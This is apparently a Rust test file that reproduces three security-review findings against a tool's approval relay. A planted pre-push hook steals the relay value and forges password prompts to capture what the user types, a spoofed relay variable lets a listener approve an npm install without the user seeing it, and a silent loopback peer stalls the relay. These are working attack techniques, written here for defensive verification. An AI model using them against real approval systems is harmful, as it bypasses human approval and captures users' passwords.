//! Independent review reproductions for CR-009 (approval relay). Each test
//! passes when the weakness is PRESENT; a fix should invert the assertions.
//! See docs/verify/REVIEW-2026-11-09-e2e-relay.md (ER-001..ER-003).

mod e2e_support;

use e2e_support::approval::{answer, pw};
use e2e_support::npm::{require_node, Pkg};
use e2e_support::npm_world::NpmWorld;
use e2e_support::{ApiClient, World};
use fail2commit_core::approval::relay;
use fail2commit_core::protocol::{ApprovalRequest, ClientMessage, Decision, ResultCode};
use std::io::{BufRead, BufReader, Read, Write};
use std::net::TcpStream;
use std::time::{Duration, Instant};

fn fwd(path: &std::path::Path) -> String {
    path.to_string_lossy().replace('\\', "/")
}

/// Act as a process that holds the relay value: send `req`, return the reply.
fn relay_call(target: &str, req: &ApprovalRequest) -> Option<ClientMessage> {
    let (addr, token) = target.split_once('/').unwrap();
    let mut c = TcpStream::connect(addr).unwrap();
    c.set_read_timeout(Some(Duration::from_secs(60))).unwrap();
    writeln!(c, "{}", serde_json::json!({ "token": token, "request": req })).unwrap();
    let mut line = String::new();
    BufReader::new(c).read_line(&mut line).ok()?;
    serde_json::from_str(&line).ok()
}

/// ER-001: the chained (repository-controlled) pre-push hook runs with the relay
/// value in its environment. It can ask the user's approval client for anything,
/// more than once, and a typed "password" comes back to it in the clear.
#[test]
fn er001_chained_hook_can_phish_through_the_relay() {
    let w = World::new();
    let (work, remote) = w.env.repo_with_remote("repo");
    w.setup();
    w.set_password("push");
    let old = w.env.head_of(&work, "HEAD");
    w.env
        .git(&work, &["commit", "-q", "--amend", "-m", "rewritten"]);

    let seen = w.env.root.join("relay-seen.txt");
    let go = w.env.root.join("go.txt");
    let hook = work.join(".git").join("hooks").join("pre-push");
    std::fs::create_dir_all(hook.parent().unwrap()).unwrap();
    std::fs::write(
        &hook,
        format!(
            "#!/bin/sh\nprintf '%s' \"$FAIL2COMMIT_APPROVAL_RELAY\" > '{s}.tmp' && mv '{s}.tmp' '{s}'\n\
             i=0; while [ ! -f '{g}' ] && [ $i -lt 120 ]; do sleep 1; i=$((i+1)); done\nexit 0\n",
            s = fwd(&seen),
            g = fwd(&go)
        ),
    )
    .unwrap();
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&hook, std::fs::Permissions::from_mode(0o755)).unwrap();
    }

    let mut api = w.api(&work, &["git", "push", "--force", "origin", "main"]);
    let real = api.approval_request();
    api.send(&answer(&real, Decision::ApproveOnce, Some(&pw("push"))));

    // The chained hook reports what it inherited.
    let t0 = Instant::now();
    let target = loop {
        if let Ok(s) = std::fs::read_to_string(&seen) {
            break s;
        }
        assert!(t0.elapsed() < Duration::from_secs(90), "chained hook never ran");
        std::thread::sleep(Duration::from_millis(200));
    };
    assert!(target.starts_with("127.0.0.1:") && target.contains('/'), "{target}");

    // Two forged prompts through the same value: not single-use, and the
    // reply (with the typed password) goes to the caller.
    for round in 0..2 {
        let mut forged = real.clone();
        forged.request_id = format!("forged-{round}");
        forged.nonce = format!("{round:0>64}");
        forged.digest = "f".repeat(64);
        forged.session = "not-the-hook-session".into();
        forged.summary = "fail2commit: session expired, re-enter your password".into();
        forged.details.clear();
        forged.findings.clear();
        forged.password_required = true;
        forged.allowed = vec![Decision::ApproveOnce];
        let t = target.clone();
        let f = forged.clone();
        let attacker = std::thread::spawn(move || relay_call(&t, &f));
        let shown = api.approval_request();
        assert_eq!(shown.summary, forged.summary, "the client showed the forgery");
        api.send(&answer(&shown, Decision::ApproveOnce, Some("typed-by-the-user")));
        let got = attacker.join().unwrap();
        let Some(ClientMessage::ApprovalResponse(r)) = got else {
            panic!("no reply reached the relay client: {got:?}")
        };
        assert_eq!(r.password.as_deref(), Some("typed-by-the-user"));
    }
    std::fs::write(&go, "x").unwrap();
    let (resp, _, out) = api.finish();
    assert_eq!(resp.code, ResultCode::Ok, "{out}");
    assert_ne!(w.env.head_of(&remote, "refs/heads/main"), old);
}

/// ER-002: `Stdio::ask` honors the relay variable in every fail2commit process,
/// not only in the hook. Whoever can set the variable and listen on a loopback
/// port answers the approval instead of the `api` client, and the client is
/// never asked.
#[test]
fn er002_relay_env_diverts_an_npm_approval_away_from_the_api_client() {
    require_node();
    let n = NpmWorld::new(&["advised"], true);
    n.reg
        .publish(&Pkg::new("advised", "1.0.0").file("index.js", "module.exports = 1;"));
    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let port = listener.local_addr().unwrap().port();
    let attacker = std::thread::spawn(move || {
        let (c, _) = listener.accept().unwrap();
        let mut out = c.try_clone().unwrap();
        let mut line = String::new();
        BufReader::new(c).read_line(&mut line).unwrap();
        let v: serde_json::Value = serde_json::from_str(&line).unwrap();
        let req: ApprovalRequest = serde_json::from_value(v["request"].clone()).unwrap();
        let reply = answer(&req, Decision::ApproveOnce, None);
        writeln!(out, "{}", serde_json::to_string(&reply).unwrap()).unwrap();
        req.summary
    });
    let mut c = n.w.cmd(&n.project);
    c.arg("api")
        .env(relay::ENV, format!("127.0.0.1:{port}/any-token"));
    let api = ApiClient::spawn(c, &n.project, &["npm", "install", "advised"]);
    // `finish` panics if the api client is ever shown an approval request.
    let (resp, exit, out) = api.finish();
    assert_eq!(resp.code, ResultCode::Ok, "{out}");
    assert_eq!(exit, 0);
    assert!(n.project.join("node_modules/advised/index.js").is_file());
    assert!(!attacker.join().unwrap().is_empty());
}

/// ER-003: the relay serves one connection at a time and waits 10 s on a silent
/// peer, so any local connection (any user) delays every hook request. Control:
/// without the stalled peer a bad request is dropped at once.
#[test]
fn er003_a_silent_loopback_peer_stalls_the_relay() {
    let r = relay::start().unwrap();
    let addr = r.env_value().split_once('/').unwrap().0.to_string();
    let drop_time = |addr: &str| {
        let mut c = TcpStream::connect(addr).unwrap();
        c.set_read_timeout(Some(Duration::from_secs(40))).unwrap();
        let t = Instant::now();
        writeln!(c, "not json").unwrap();
        let mut b = Vec::new();
        let _ = c.read_to_end(&mut b);
        t.elapsed()
    };
    let control = drop_time(&addr);
    assert!(control < Duration::from_secs(2), "control: {control:?}");
    let _silent = TcpStream::connect(&addr).unwrap();
    let stalled = drop_time(&addr);
    assert!(
        stalled > Duration::from_secs(8),
        "a later peer waited behind the silent one: {stalled:?}"
    );
}
